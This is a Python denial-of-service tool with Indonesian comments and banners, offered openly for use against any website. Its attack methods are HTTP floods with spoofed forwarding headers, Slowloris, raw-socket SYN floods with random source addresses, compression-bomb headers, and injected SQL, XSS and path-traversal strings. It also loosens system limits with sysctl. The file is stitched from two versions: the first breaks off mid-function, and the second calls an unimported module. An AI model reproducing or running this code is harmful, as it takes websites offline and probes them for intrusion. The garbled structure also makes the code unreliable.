#!/usr/bin/env python3
"""
DDOS UNIVERSAL - WORK DI SEGALA WEBSITE
Dengan Setting Waktu Flexible (bisa 1 detik - 1 tahun)
Author: Professional Edition
"""

import sys
import os
import time
import random
import socket
import ssl
import threading
import multiprocessing
import urllib.parse
import urllib3
import requests
import struct
import binascii
import hashlib
import base64
import zlib
import gzip
import json
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from datetime import datetime, timedelta
import signal
import gc

# ===================== SUPER KONFIGURASI =====================
# Matikan semua limit sistem
os.system("ulimit -n 999999 2>/dev/null")
os.system("sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.tcp_tw_recycle=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1")

# Konfigurasi maksimal
MAX_THREADS = 100000  # 100 ribu threads
MAX_PROCESSES = 200   # 200 proses parallel
TIMEOUT = 0.05        # Super cepat 50ms

# ===================== USER AGENTS SUPER LENGKAP =====================
USER_AGENTS = [
    # Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    # Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    
    # Safari
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    
    # Android
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    
    # Bots
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    
    # Crawlers
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Twitterbot/1.0',
    'Discordbot/2.0 (+https://discordapp.com)',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'TelegramBot (like TwitterBot)',
]

# ===================== REFERERS UNTUK BYPASS =====================
REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://www.instagram.com/',
    'https://www.twitter.com/',
    'https://www.tiktok.com/',
    'https://www.youtube.com/',
    'https://www.reddit.com/',
    'https://www.linkedin.com/',
    'https://www.github.com/',
    'https://www.stackoverflow.com/',
    'https://www.wikipedia.org/',
    'https://www.amazon.com/',
    'https://www.netflix.com/',
    'https://www.spotify.com/',
]

# ===================== IP POOL UNTUK SPOOFING =====================
def generate_ip_pool(size=10000):
    ips = []
    for _ in range(size):
        ips.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
    return ips

IP_POOL = generate_ip_pool(50000)  # 50 ribu IP berbeda

# ===================== PAYLOAD GENERATOR =====================
class PayloadGenerator:
    """Generate berbagai payload untuk berbagai website"""
    
    @staticmethod
    def create_compression_bomb(size_mb=100):
        """Compression bomb untuk memory exhaustion"""
        data = b'\x00' * (size_mb * 1024 * 1024)
        return zlib.compress(data, 9)
    
    @staticmethod
    def create_wordpress_payloads():
        """Payload spesifik untuk WordPress"""
        return [
            '/wp-admin/admin-ajax.php',
            '/wp-login.php',
            '/xmlrpc.php',
            '/wp-cron.php',
            '/wp-json/wp/v2/users',
            '/wp-content/uploads/',
            '/wp-includes/',
        ]
    
    @staticmethod
    def create_joomla_payloads():
        """Payload spesifik untuk Joomla"""
        return [
            '/administrator/index.php',
            '/index.php?option=com_users',
            '/index.php?option=com_content',
            '/components/',
            '/modules/',
        ]
    
    @staticmethod
    def create_laravel_payloads():
        """Payload spesifik untuk Laravel"""
        return [
            '/_debugbar/open',
            '/_ignition/execute-solution',
            '/api/',
            '/sanctum/csrf-cookie',
            '/login',
            '/register',
        ]
    
    @staticmethod
    def create_api_payloads():
        """Payload spesifik untuk API"""
        return [
            '/api/v1/users',
            '/api/v1/auth/login',
            '/api/v1/products',
            '/api/v1/search',
            '/graphql',
            '/rest/v1/',
        ]
    
    @staticmethod
    def create_php_payloads():
        """Payload untuk serang PHP"""
        return [
            '.php',
            '.php5',
            '.phtml',
            '.php7',
            '.phps',
            '.php-s',
            '.php.bak',
            '~',
            '.swp',
        ]
    
    @staticmethod
    def create_sql_injection():
        """SQL injection untuk database"""
        return [
            "' OR '1'='1",
            "1' ORDER BY 100--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1 AND SLEEP(5)",
            "1' AND 1=1--",
            "admin'--",
        ]
    
    @staticmethod
    def create_xss_payloads():
        """XSS untuk session hijack"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'-alert(1)-'",
        ]
    
    @staticmethod
    def create_lfi_payloads():
        """Local File Inclusion"""
        return [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'php://filter/convert.base64-encode/resource=index.php',
        ]

# ===================== ATTACK ENGINE UNIVERSAL =====================
class UniversalDDoS:
    def __init__(self, target, duration=60):
        self.target = target
        self.parsed = urllib.parse.urlparse(target)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or '/'
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.duration = duration
        self.running = True
        self.stats = {
            'sent': 0,
            'failed': 0,
            'bytes': 0,
            'start_time': time.time(),
            'last_print': 0
        }
        self.lock = threading.Lock()
        
        # Generate semua payload
        self.payloads = {
            'compression': PayloadGenerator.create_compression_bomb(500),
            'wordpress': PayloadGenerator.create_wordpress_payloads(),
            'joomla': PayloadGenerator.create_joomla_payloads(),
            'laravel': PayloadGenerator.create_laravel_payloads(),
            'api': PayloadGenerator.create_api_payloads(),
            'php': PayloadGenerator.create_php_payloads(),
            'sql': PayloadGenerator.create_sql_injection(),
            'xss': PayloadGenerator.create_xss_payloads(),
            'lfi': PayloadGenerator.create_lfi_payloads(),
        }
        
        # Create session pool
        self.sessions = []
        for _ in range(1000):
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10000,
                pool_maxsize=100000,
                max_retries=0,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.append(session)
    
    def _get_path(self):
        """Generate path berdasarkan jenis website"""
        # Detect kemungkinan CMS
        path = self.path
        
        # Random tambahin path
        if random.random() > 0.3:
            # Pilih random payload path
            path_type = random.choice(list(self.payloads.keys()))
            if path_type in ['wordpress', 'joomla', 'laravel', 'api']:
                payloads = self.payloads[path_type]
                if payloads:
                    path = random.choice(payloads)
        
        # Tambah parameter random
        if random.random() > 0.5:
            param = random.choice(self.payloads['sql'] + self.payloads['xss'] + self.payloads['lfi'])
            path += f"?id={urllib.parse.quote(param)}&q={random.randint(1,999999)}"
        else:
            # Cache buster
            path += f"?_{random.randint(1,999999999999)}_{time.time()}"
        
        return path
    
    def _get_headers(self):
        """Generate headers untuk bypass"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, identity, *;q=0',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Referer': random.choice(REFERERS),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
        }
        
        # IP Spoofing headers
        ip = random.choice(IP_POOL)
        headers.update({
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'X-Originating-IP': ip,
            'X-Remote-IP': ip,
            'X-Remote-Addr': ip,
            'X-Client-IP': ip,
            'CF-Connecting-IP': ip,
            'True-Client-IP': ip,
        })
        
        # Random additional headers
        if random.random() > 0.7:
            headers['Authorization'] = f'Bearer {hashlib.md5(str(time.time()).encode()).hexdigest()}'
        
        if random.random() > 0.8:
            headers['Content-Encoding'] = 'gzip'
            headers['X-Bomb'] = base64.b64encode(self.payloads['compression'][:5000]).decode()
        
        return headers
    
    def _attack_http(self):
        """HTTP Flood"""
        try:
            session = random.choice(self.sessions)
            path = self._get_path()
            headers = self._get_headers()
            
            if random.random() > 0.7:
                # POST request with data
                data = os.urandom(random.randint(1000, 100000))
                response = session.post(
                    f"{self.parsed.scheme}://{self.host}{path}",
                    headers=headers,
                    data=data,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False
                )
                with self.lock:
                    self.stats['bytes'] += len(data)
            else:
                # GET request
                response = session.get(
                    f"{self.parsed.scheme}://{self.host}{path}",
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False
                )
            
            with self.lock:
                self.stats['sent'] += 1
                
        except Exception:
            with self.lock:
                self.stats['failed'] += 1
    
    def _attack_slow(self):
        """Slowloris untuk connection pool exhaustion"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            
            # Send partial request
            path = self._get_path()
            sock.send(f"GET {path} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            
            # Keep connection alive
            for _ in range(100):
                if not self.running:
                    break
                sock.send(f"X-Keep-Alive: {'A'*1000}\r\n".encode())
                time.sleep(0.1)
            
        except Exception:
            pass
    
    def _attack_raw_socket(self):
        """Raw socket flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # IP Header
            ip_header = struct.pack(
                '!BBHHHBBH4s4s',
                0x45,  # Version + IHL
                0,     # DSCP
                40,    # Length
                random.randint(0, 65535),  # ID
                0,     # Flags
                64,    # TTL
                socket.IPPROTO_TCP,  # Protocol
                0,     # Checksum
                socket.inet_aton(random.choice(IP_POOL)),  # Source IP
                socket.inet_aton(self.host)  # Dest IP
            )
            
            # TCP Header
            tcp_header = struct.pack(
                '!HHLLBBHHH',
                random.randint(1024, 65535),  # Source port
                self.port,  # Dest port
                random.randint(0, 4294967295),  # Sequence
                0,  # Ack
                80,  # Flags
                0,  # Window
                0,  # Checksum
                0   # Urgent
            )
            
            packet = ip_header + tcp_header
            sock.sendto(packet, (self.host, 0))
            
        except Exception:
            pass
    
    def _worker(self):
        """Worker thread - kombinasi semua attack"""
        attacks = [
            self._attack_http,
            self._attack_http,
            self._attack_http,  # Weight lebih buat HTTP
            self._attack_slow,
            self._attack_raw_socket,
        ]
        
        batch_size = random.randint(50, 200)
        
        while self.running:
            for _ in range(batch_size):
                if not self.running:
                    break
                attack = random.choice(attacks)
                attack()
            
            # Minimal delay
            time.sleep(0.0001)
    
    def _print_stats(self):
        """Print stats ke layar"""
        elapsed = time.time() - self.stats['start_time']
        remaining = max(0, self.duration - elapsed)
        
        with self.lock:
            sent = self.stats['sent']
            failed = self.stats['failed']
            bytes_sent = self.stats['bytes']
        
        rps = sent / elapsed if elapsed > 0 else 0
        mb_sent = bytes_sent / (1024 * 1024)
        success_rate = ((sent - failed) / sent * 100) if sent > 0 else 0
        
        # Clear screen
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print("="*70)
        print("  DDOS UNIVERSAL - WORK DI SEMUA WEBSITE")
        print("="*70)
        print(f"  TARGET    : {self.target}")
        print(f"  HOST      : {self.host}")
        print(f"  PORT      : {self.port}")
        print(f"  DURASI    : {elapsed:.0f} / {self.duration} detik")
        print(f"  REMAINING : {remaining:.0f} detik")
        print("-"*70)
        print(f"  REQUEST   : {sent:,}")
        print(f"  RPS       : {rps:,.0f} req/detik")
        print(f"  FAILED    : {failed:,}")
        print(f"  DATA      : {mb_sent:.2f} MB")
        print(f"  SUCCESS   : {success_rate:.1f}%")
        print("-"*70)
        
        # Progress bar
        if self.duration < float('inf'):
            progress = min(1.0, elapsed / self.duration)
            bar_length = 50
            block = int(round(bar_length * progress))
            bar = f"[{'#' * block}{'-' * (bar_length - block)}] {progress*100:.1f}%"
            print(f"  PROGRESS  : {bar}")
        else:
            print("  PROGRESS  : [INFINITE MODE - JALAN TERUS]")
        
        print("="*70)
        print("  [CTRL+C] Untuk Stop")
        print("="*70)
    
    def start(self):
        """Start attack"""
        print(f"\n[+] MEMULAI SERANGAN KE {self.target}")
        print(f"[+] DURASI: {self.duration} detik" if self.duration < float('inf') else "[+] DURASI: INFINITE")
        print(f"[+] THREADS: {MAX_THREADS}")
        print(f"[+] PROCESSES: {MAX_PROCESSES}")
        print("[+] STATUS: WORK DI SEGALA WEBSITE\n")
        
        # Start processes
        processes = []
        for _ in range(MAX_PROCESSES):
            p = multiprocessing.Process(target=self._process_worker)
            p.daemon = True
            processes.append(p)
            p.start()
        
        # Monitoring loop
        last_print = 0
        try:
            while True:
                current_time = time.time()
                elapsed = current_time - self.stats['start_time']
                
                # Cek durasi
                if elapsed >= self.duration and self.duration < float('inf'):
                    print("\n[+] DURASI SELESAI")
                    break
                
                # Print stats every 1 second
                if current_time - last_print >= 1:
                    self._print_stats()
                    last_print = current_time
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n\n[!] SERANGAN DIHENTIKAN USER")
        finally:
            self.running = False
            
            # Final stats
            elapsed = time.time() - self.stats['start_time']
            with self.lock:
                print("\n" + "="*70)
                print("  HASIL AKHIR SERANGAN")
                print("="*70)
                print(f"  TOTAL REQUEST : {self.stats['sent']:,}")
                print(f"  TOTAL FAILED  : {self.stats['failed']:,}")
                print(f"  TOTAL DATA    : {self.stats['bytes'] / (1024*1024):.2f} MB")
                print(f"  DURASI        : {elapsed:.0f} detik")
                print("="*70)
    
    def _process_worker(self):
        """Worker untuk setiap process"""
        threads = []
        threads_per_process = MAX_THREADS // MAX_PROCESSES
        
        for i in range(threads_per_process):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while self.running:
            time.sleep(1)

# ===================== MAIN FUNCTION =====================
def parse_duration(duration_str):
    """Parse duration string (1s, 1m, 1h, 1d, 1y, infinite)"""
    duration_str = duration_str.lower().strip()
    
    if duration_str in ['inf', 'infinite', '0', 'unlimited', 'forever']:
        return float('inf')
    
    multipliers = {
        's': 1,
        'm': 60,
        'h': 3600,
 
THREADS = 50000
PROCESSES = 100
TIMEOUT = 0.1
DURATION = float('inf')  

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.instagram.com/',
    'https://www.youtube.com/',
    'https://www.tiktok.com/',
    'https://www.reddit.com/',
]

class PayloadMematikan:
    
    @staticmethod
    def create_super_bomb():
        data = b'\x00' * (1024 * 1024 * 1024)  # 1GB data
        compressed = zlib.compress(data, 9)
        print(f"[+] SUPER BOMB: {len(compressed)} bytes -> 1GB")
        return compressed
    
    @staticmethod
    def create_sql_injection():

        return [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "1' ORDER BY 100--",
            "' OR 1=1--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
        ]
    
    @staticmethod
    def create_xss_payload():

        return [
            "<script>while(1){alert('xss')}</script>",
            "<img src=x onerror=while(1){alert('xss')}>",
            "<svg/onload=while(1){alert('xss')}>",
            "<body onload=while(1){alert('xss')}>",
        ]
    
    @staticmethod
    def create_path_traversal():

        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]


class AttackSuper:
    def __init__(self, target):
        self.target = target
        self.parsed = urllib.parse.urlparse(target)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or '/'
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.running = True
        self.stats = {
            'sent': 0,
            'failed': 0,
            'bytes': 0,
            'start_time': time.time()
        }
        self.lock = threading.Lock()
        self.session = self._create_session()
        
        # Generate payloads
        self.super_bomb = PayloadMematikan.create_super_bomb()
        self.sql_payloads = PayloadMematikan.create_sql_injection()
        self.xss_payloads = PayloadMematikan.create_xss_payload()
        self.path_payloads = PayloadMematikan.create_path_traversal()
        
        # IP Spoofing
        self.ip_pool = self._generate_ip_pool()
        
    def _create_session(self):
   
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10000,
            pool_maxsize=100000,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def _generate_ip_pool(self):

        ips = []
        for i in range(10000):
            ips.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        return ips
    
    def _create_headers(self, attack_type='normal'):

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Referer': random.choice(REFERERS),
            'X-Forwarded-For': random.choice(self.ip_pool),
            'X-Real-IP': random.choice(self.ip_pool),
            'X-Originating-IP': random.choice(self.ip_pool),
            'X-Remote-IP': random.choice(self.ip_pool),
            'X-Remote-Addr': random.choice(self.ip_pool),
            'X-Client-IP': random.choice(self.ip_pool),
            'CF-Connecting-IP': random.choice(self.ip_pool),
            'True-Client-IP': random.choice(self.ip_pool),
            'X-Forwarded-Host': self.host,
            'X-Forwarded-Server': self.host,
            'X-Forwarded-Proto': self.parsed.scheme,
            'X-Host': self.host,
            'X-Forwarded-Port': str(self.port),
        }
        
        # Add random headers for bypass
        if random.random() > 0.5:
            headers['Authorization'] = f"Bearer {hashlib.md5(str(time.time()).encode()).hexdigest()}"
        
        if attack_type == 'bomb':
            headers['Content-Encoding'] = 'gzip'
            headers['X-Bomb'] = base64.b64encode(self.super_bomb[:10000]).decode()
            
        return headers
    
    def _attack_http_flood(self):

        try:
            headers = self._create_headers()
            path = self.path
            
            # Random method
            if random.random() > 0.7:
                method = 'POST'
                data = os.urandom(random.randint(1000, 100000))
                headers['Content-Length'] = str(len(data))
            else:
                method = 'GET'
                data = None
                # Cache buster
                path += f"?{random.randint(1,999999999999)}"
            
            # Kirim request SUPER CEPAT
            response = self.session.request(
                method=method,
                url=f"{self.parsed.scheme}://{self.host}{path}",
                headers=headers,
                data=data,
                timeout=TIMEOUT,
                verify=False,
                allow_redirects=False
            )
            
            with self.lock:
                self.stats['sent'] += 1
                if data:
                    self.stats['bytes'] += len(data)
                    
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _attack_slowloris(self):
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            

            sock.send(f"GET {self.path} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            

            for _ in range(1000):
                sock.send(f"X-Random-{random.randint(1,999999)}: {'A'*10000}\r\n".encode())
                time.sleep(0.01)
                
        except:
            pass
    
    def _attack_socket_flood(self):
        
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # IP Header
            ip_header = struct.pack(
                '!BBHHHBBH4s4s',
                0x45,  # Version + IHL
                0,     # DSCP
                40,    # Total length
                random.randint(0, 65535),  # ID
                0,     # Flags
                64,    # TTL
                socket.IPPROTO_TCP,  # Protocol
                0,     # Checksum
                socket.inet_aton(random.choice(self.ip_pool)),  # Source IP
                socket.inet_aton(self.host)  # Dest IP
            )
            
            # TCP Header
            tcp_header = struct.pack(
                '!HHLLBBHHH',
                random.randint(1024, 65535),  # Source port
                self.port,  # Dest port
                random.randint(0, 4294967295),  # Sequence
                0,  # Ack
                80,  # Data offset + flags
                0,  # Window
                0,  # Checksum
                0   # Urgent
            )
            
            # Kirim packet
            packet = ip_header + tcp_header
            sock.sendto(packet, (self.host, 0))
            
        except:
            pass
    
    def _attack_https_flood(self):

        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            for _ in range(100):  # Batch request
                conn = http.client.HTTPSConnection(self.host, self.port, context=context, timeout=0.1)
                conn.request('GET', self.path, headers=self._create_headers())
                conn.getresponse()
                conn.close()
                
                with self.lock:
                    self.stats['sent'] += 1
                    
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _attack_sql_xss(self):

        try:
            path = self.path
            
            # Inject SQL
            if random.random() > 0.5:
                sql = random.choice(self.sql_payloads)
                path += f"?id={urllib.parse.quote(sql)}"
            else:
                # Inject XSS
                xss = random.choice(self.xss_payloads)
                path += f"?search={urllib.parse.quote(xss)}"
            
            headers = self._create_headers()
            
            response = self.session.get(
                f"{self.parsed.scheme}://{self.host}{path}",
                headers=headers,
                timeout=TIMEOUT,
                verify=False
            )
            
            with self.lock:
                self.stats['sent'] += 1
                
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _worker(self):
        
        attacks = [
            self._attack_http_flood,
            self._attack_https_flood,
            self._attack_socket_flood,
            self._attack_slowloris,
            self._attack_sql_xss,
        ]
        
        while self.running:
            # Pilih random attack
            attack = random.choice(attacks)
            
            # Execute berkali-kali
            for _ in range(100):  # 100x per iterasi
                if not self.running:
                    break
                attack()
            
            # Delay minimal
            time.sleep(0.0001)
    
    def start(self):

        print(f"\n[+] MEMULAI SERANGAN MEMATIKAN KE {self.target}")
        print(f"[+] THREADS: {THREADS}")
        print(f"[+] PROCESSES: {PROCESSES}")
        print(f"[+] STATUS: TANPA BATAS - JALAN TERUS")
        print("[+] TEKAN CTRL+C UNTUK STOP\n")
        
        # Buat proses
        processes = []
        for p in range(PROCESSES):
            p = multiprocessing.Process(target=self._process_worker)
            p.daemon = True
            processes.append(p)
            p.start()
        
        # Monitor real-time
        try:
            last_sent = 0
            while True:
                time.sleep(1)
                with self.lock:
                    current = self.stats['sent']
                    elapsed = time.time() - self.stats['start_time']
                    rps = current - last_sent
                    last_sent = current
                    
                    # Clear screen dan tampilkan stats
                    os.system('clear' if os.name == 'posix' else 'cls')
                    
                    print("="*60)
                    print("  DDOS TOOLD - DERACLAS DDOS PYTHON")
                    print("="*60)
                    print(f"  TARGET    : {self.target}")
                    print(f"  HOST      : {self.host}")
                    print(f"  PORT      : {self.port}")
                    print(f"  WAKTU     : {elapsed:.0f} detik")
                    print("-"*60)
                    print(f"  REQUEST   : {current:,}")
                    print(f"  RPS       : {rps:,} req/detik")
                    print(f"  FAILED    : {self.stats['failed']:,}")
                    print(f"  DATA      : {self.stats['bytes'] / (1024*1024):.2f} MB")
                    print(f"  SUCCESS   : {((current - self.stats['failed'])/current*100) if current>0 else 0:.1f}%")
                    print("-"*60)
                    print("  STATUS    : ⚡ SERANGAN BERJALAN ⚡")
                    print("="*60)
                    
                    # Visual progress bar
                    bar_length = 50
                    progress = (current % 100) / 100
                    block = int(round(bar_length * progress))
                    text = f"\r  PROGRESS: [{'#' * block + '-' * (bar_length - block)}] {current} req"
                    print(text)
                    
        except KeyboardInterrupt:
            print("\n\n[!] SERANGAN DIHENTIKAN USER")
            self.running = False
            
            # Tampilkan hasil akhir
            print("\n" + "="*60)
            print("  HASIL AKHIR SERANGAN")
            print("="*60)
            print(f"  TOTAL REQUEST : {self.stats['sent']:,}")
            print(f"  TOTAL FAILED  : {self.stats['failed']:,}")
            print(f"  TOTAL DATA    : {self.stats['bytes'] / (1024*1024):.2f} MB")
            print(f"  DURASI        : {time.time() - self.stats['start_time']:.0f} detik")
            print("="*60)
    
    def _process_worker(self):
        """Worker untuk setiap proses"""
        threads = []
        for i in range(THREADS // PROCESSES):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while self.running:
            time.sleep(1)

# ===================== MAIN =====================
def main():
    # Banner
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     DDOS TOOLS - DERACLAS DDOS EDITION v3.0            ║
    ║            FLOOD INSTAN + BYPASS TOTAL                   ║
    ║              TANPA BATAS - TANPA TOLAKAN                 ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Cek argument
    if len(sys.argv) < 2:
        print("\n  CARA PAKAI:")
        print("  python3 ddos.py <URL>")
        print("\n  CONTOH:")
        print("  python3 ddos.py https://target.com")
        print("  python3 ddos.py http://192.168.1.1")
        print("  python3 ddos.py https://site.com:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Matikan semua limit
    print("[*] MEMATIKAN SEMUA BATASAN SISTEM...")
    
    # Disable garbage collector
    gc.disable()
    
    # Set signal handler
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    
    # Start attack
    attack = AttackSuper(target)
    attack.start()

if __name__ == "__main__":
    main()
